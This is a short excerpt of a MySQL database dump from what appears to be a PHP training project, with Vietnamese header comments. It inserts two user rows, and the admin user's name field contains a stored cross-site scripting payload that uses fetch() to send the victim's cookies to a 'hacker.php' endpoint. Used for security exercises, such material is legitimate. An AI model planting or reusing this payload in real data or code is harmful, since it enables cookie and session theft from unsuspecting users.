...
--
-- Máy chủ: localhost
-- Thời gian đã tạo: Th10 05, 2023 lúc 01:08 AM
...
INSERT INTO `users` (`id`, `name`, `fullname`, `email`, `type`, `password`, `lock_version`) VALUES
(1, 'admin <script>fetch(`http://localhost/training-php/hacker.php?cookie=${document.cookie}`)</script>', 'Admin', 'admin1@gmail.com', 'admin', 'd41d8cd98f00b204e9800998ecf8427e', 6),
(2, 'user88', 'User1', 'user1@gmail.com', 'user', 'd41d8cd98f00b204e9800998ecf8427e', 10);
...
--
ALTER TABLE `post`
  MODIFY `post_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=482;
